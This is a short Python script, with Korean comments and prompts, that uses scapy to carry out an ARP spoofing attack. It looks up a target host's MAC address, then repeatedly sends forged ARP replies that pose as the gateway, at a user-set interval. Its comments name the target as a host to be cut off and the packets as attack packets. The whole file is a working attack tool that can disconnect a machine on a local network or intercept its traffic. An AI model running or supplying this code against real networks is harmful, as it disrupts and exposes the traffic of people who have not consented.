from scapy.all import *
import time
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP
from colorama import Fore, Style
import scapy.all as scapy

send_cicle = int(input("재전송 패킷을 보낼 주기 입력(초) : "))
send_count = int(input("총 보낼 packet 수 : "))
# 끊을 대상 IP 주소
gatway_ip="172.36.141.1"
target_ip = ["172.36.141.54"]
target_mac=[]
my_mac="70:DD:CC:BB:AA:FF"
# 네트워크 인터페이스
iface = "이더넷"

for ip in target_ip:
    time.sleep(1)
    try:
        result, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=iface, timeout=2, verbose=False)   # 대상 IP 주소에 대한 MAC 주소 확인
        target_mac.append(result[0][1].hwsrc)
    except:
        print(f"{ip}의 MAC주소 받아오기 실패")

if (len(target_mac) != len(target_ip)): #ip n개에 대한 mac주소 n개가 확보되지 않았으면 프로그램 종료
    exit()

print(target_ip, target_mac)

# Let's get it 
for j in range(send_count):
    k=0
    try:
        for k in range(0,len(target_ip)):
            # 변조 패킷 생성
            spoof = ARP(op=2, pdst=target_ip[k], hwdst=target_mac[k], psrc=gatway_ip, hwsrc=my_mac)

            # 공격 패킷 전송
            send(spoof, verbose=False)

        print(Fore.GREEN+f"\n전송완료({j+1}/{send_count})"+Style.RESET_ALL,end="\n")
        if j != (send_count-1):
            for i in range(send_cicle):
                print(f"\r{send_cicle-i}초 뒤 재 전송", end="")
                time.sleep(1)
        else:
            print(f"\n패킷 총 {j+1}개 전송 완료.\n")
            pass

    except KeyboardInterrupt:
        break
